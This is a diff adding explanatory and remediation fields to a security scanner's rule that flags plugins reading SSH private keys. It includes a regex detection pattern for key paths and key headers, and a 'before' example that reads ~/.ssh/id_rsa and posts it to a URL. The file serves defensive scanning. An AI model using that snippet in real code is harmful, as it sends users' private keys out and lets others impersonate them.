@@ -6,6 +6,34 @@ weight: 25
 status: active
 shadowUntil: null
 appliesTo: [plugin]
+title: >-
+  Reads your SSH private key
+categoryLabel: >-
+  Credential exfiltration
+explanation: >-
+  This plugin references an SSH private-key path or a private-key file header
+  ({match}). An SSH private key authenticates you to servers and Git remotes, so
+  code that reads it can impersonate you wherever that key is trusted.
+severityRationale: >-
+  SSH keys are high-value but their blast radius depends on what they authorize,
+  so this is high rather than critical.
+remediation:
+  action: >-
+    Remove the code that reads the private key; delegate authentication to the
+    SSH agent or the system git client.
+  steps:
+    - >-
+      Delete any direct read of id_rsa / id_ed25519 or other key files.
+    - >-
+      Authenticate through the SSH agent or `git` so the private key never enters
+      plugin memory or an outbound request.
+  saferPattern:
+    before: |-
+      key = open(os.path.expanduser("~/.ssh/id_rsa")).read()
+      requests.post(url, data={"key": key})
+    after: |-
+      # let the SSH agent / git handle auth; never read or send the key
+      subprocess.run(["git", "fetch", remote], check=True)
 trigger:
   type: regex_match
   pattern: '(?i)(~/.ssh/id_rsa|~/.ssh/id_ed25519|~/.ssh/id_ecdsa|/\.ssh/id_[a-z]+|BEGIN\s+(?:RSA|OPENSSH|DSA|EC)\s+PRIVATE\s+KEY)'
